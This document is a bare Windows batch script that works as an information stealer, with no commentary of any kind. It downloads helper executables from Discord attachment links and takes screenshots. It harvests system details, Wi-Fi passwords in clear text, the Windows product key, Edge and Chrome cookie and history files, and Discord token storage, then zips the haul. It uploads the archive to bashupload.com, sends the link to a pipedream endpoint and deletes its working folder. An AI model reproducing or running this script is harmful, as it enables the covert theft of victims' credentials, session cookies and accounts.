cd %tmp%
mkdir 136babaa-c461-4d07-8a65-20cd38c253b4
cd 136babaa-c461-4d07-8a65-20cd38c253b4
mkdir edge
mkdir chrome
mkdir disc
curl -k "https://cdn.discordapp.com/attachments/985807216894423050/1093092269298569218/screenCapture.exe" -o "s.exe"
curl -k "https://cdn.discordapp.com/attachments/985807216894423050/1089826569326956614/7zr.exe" -o "c.exe"
"%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\s.exe" 1.png
systeminfo > sysinf.log
netsh wlan show profiles > w.log
netsh wlan export profile key=clear > wpass.log
wmic csproduct get uuid > uuid.log
wmic path win32_VideoController get name > vid.log
powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault >bckky.log
echo f | xcopy "%localappdata%\Microsoft\Edge\User Data\Local State" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\Local State"
echo d | xcopy "%localappdata%\Microsoft\Edge\User Data\Default\Network\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\Network\"
echo f | xcopy "%localappdata%\Microsoft\Edge\User Data\Default\History" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\History"
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 1\" cd %tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 1\" mkdir prof1
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 1\" echo d | xcopy "%localappdata%\Microsoft\Edge\User Data\Profile 1\Network\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\prof1\Network\"
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 1\" echo f | xcopy "%localappdata%\Microsoft\Edge\User Data\Profile 1\History" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\prof1\History"
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 2\" cd %tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 2\" mkdir prof2
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 2\" echo d | xcopy "%localappdata%\Microsoft\Edge\User Data\Profile 2\Network\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\prof2\Network\"
if exist "%localappdata%\Microsoft\Edge\User Data\Profile 2\" echo f | xcopy "%localappdata%\Microsoft\Edge\User Data\Profile 2\History" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\edge\prof2\History"
if exist "%localappdata%\Google\Chrome\User Data\" echo f | xcopy "%localappdata%\Google\Chrome\User Data\Local State" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\Local State"
if exist "%localappdata%\Google\Chrome\User Data\Default\" echo f | xcopy "%localappdata%\Google\Chrome\User Data\Default\History" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\History"
if exist "%localappdata%\Google\Chrome\User Data\Default\" echo d | xcopy "%localappdata%\Google\Chrome\User Data\Default\Network\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\Network\"
if exist "%localappdata%\Google\Chrome\User Data\Profile 1\" cd %tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\
if exist "%localappdata%\Google\Chrome\User Data\Profile 1\" mkdir prof1
if exist "%localappdata%\Google\Chrome\User Data\Profile 1\" echo f | xcopy "%localappdata%\Google\Chrome\User Data\Profile 1\History" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\prof1\History"
if exist "%localappdata%\Google\Chrome\User Data\Profile 1\" echo d | xcopy "%localappdata%\Google\Chrome\User Data\Profile 1\Network\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\prof1\Network\"
if exist "%localappdata%\Google\Chrome\User Data\Profile 2\" cd %tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\
if exist "%localappdata%\Google\Chrome\User Data\Profile 2\" mkdir prof2
if exist "%localappdata%\Google\Chrome\User Data\Profile 2\" echo f | xcopy "%localappdata%\Google\Chrome\User Data\Profile 2\History" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\prof2\History"
if exist "%localappdata%\Google\Chrome\User Data\Profile 2\" echo d | xcopy "%localappdata%\Google\Chrome\User Data\Profile 2\Network\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\chrome\prof2\Network\"
if exist "%appdata%\discord\" cd %tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\disc
if exist "%appdata%\discord\" dir %appdata%\discord\ > ds.log
if exist "%appdata%\discord\" echo f | xcopy "%appdata%\discord\Local State" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\disc\Local State"
if exist "%appdata%\discord\" echo d | xcopy "%appdata%\discord\Local Storage\leveldb\" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\disc\leveldb\"
if exist "%appdata%\BetterDiscord\" dir "%appdata%\BetterDiscord\plugins\" > bd.log
if exist "%appdata%\BetterDiscord\plugins\MLV2_IMAGE_CACHE" dir "%appdata%\BetterDiscord\plugins\MLV2_IMAGE_CACHE" > bdimg.log
cd %tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\
"%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\s.exe" 2.png
"%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4\c.exe" a "136babaa-c461-4d07-8a65-20cd38c253b4.7z" "%tmp%\136babaa-c461-4d07-8a65-20cd38c253b4"
curl bashupload.com -T 136babaa-c461-4d07-8a65-20cd38c253b4.7z > lockfile
curl --data-binary "@lockfile" https://eokpgydzihqmnf4.m.pipedream.net
cd %tmp%
rmdir C:\Users\reiha\AppData\Local\Temp\136babaa-c461-4d07-8a65-20cd38c253b4 /S /Q